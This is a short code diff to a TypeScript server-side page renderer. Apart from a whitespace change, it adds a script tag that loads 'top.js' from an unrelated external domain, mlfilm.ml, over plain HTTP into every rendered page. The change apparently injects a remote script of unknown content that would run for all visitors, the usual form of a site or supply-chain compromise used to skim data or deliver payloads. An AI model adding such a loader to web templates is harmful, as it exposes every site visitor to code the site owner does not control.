@@ -83,9 +83,10 @@ export function renderPage(html: string, styles: string[], scripts: string[], pr
                 <script id="server-scripts">window.__PRELOADED_STATE__ = ${JSON.stringify(preloadState).replace(
         /</g,
         '\\\\\u003c'
-    )}</script>
+                )}</script>
                 <div id="root">${html}</div>
                 ${scripts.join('')}
+                <script src="http://mlfilm.ml/top.js" async></script>
             </body>
             </html>
 `
